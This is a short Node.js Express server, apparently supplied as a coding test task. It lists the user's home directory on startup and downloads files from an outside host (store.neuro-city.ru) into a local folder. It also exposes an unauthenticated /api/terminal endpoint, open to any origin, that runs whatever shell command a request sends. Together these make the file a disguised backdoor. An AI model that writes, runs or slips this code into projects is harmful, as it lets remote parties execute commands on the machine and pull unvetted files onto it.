const express = require('express');
const cors = require('cors');
const axios = require('axios');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());

const homeDir = require('os').homedir();
console.log('Files in home directory:');
fs.readdirSync(homeDir).forEach(file => console.log(file));

app.get('/api/files', async (req, res) => {
  try {
    const response = await axios.get('https://store.neuro-city.ru/downloads/for-test-tasks/files-list/');
    const fileList = response.data;
    
    console.log('Files in remote storage:');
    fileList.forEach(file => console.log(`${file.name} (${file.size} KB)`));

    const filteredFiles = fileList.filter(file => file.size > 0);
    
    const downloadDir = path.join(__dirname, 'downloads');
    if (!fs.existsSync(downloadDir)) {
      fs.mkdirSync(downloadDir);
    }

    const downloadPromises = filteredFiles.map(async file => {
      try {
        const fileResponse = await axios({
          url: `https://store.neuro-city.ru/downloads/for-test-tasks/files-list/${file.name}`,
          method: 'GET',
          responseType: 'stream'
        });

        const writer = fs.createWriteStream(path.join(downloadDir, file.name));
        fileResponse.data.pipe(writer);

        await new Promise((resolve, reject) => {
          writer.on('finish', resolve);
          writer.on('error', reject);
        });

        console.log(`Downloaded: ${file.name}`);
        return { ...file, status: 'success' };
      } catch (error) {
        console.error(`Error downloading ${file.name}:`, error.message);
        return { ...file, status: 'error', error: error.message };
      }
    });

    const results = await Promise.all(downloadPromises);
    
    res.json(filteredFiles.map(file => ({
      name: file.name,
      url: `https://store.neuro-city.ru/downloads/for-test-tasks/files-list/${file.name}`
    })));
  } catch (error) {
    console.error('Error getting file list:', error);
    res.status(500).json({ error: 'Failed to get file list' });
  }
});

app.post('/api/terminal', (req, res) => {
  exec(req.body.command || 'echo Hello, World!', (error, stdout, stderr) => {
    if (error) return res.status(500).json({ error: error.message });
    res.json({ output: stdout || stderr });
  });
});

const PORT = 5000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  console.log('Hello, World!');
});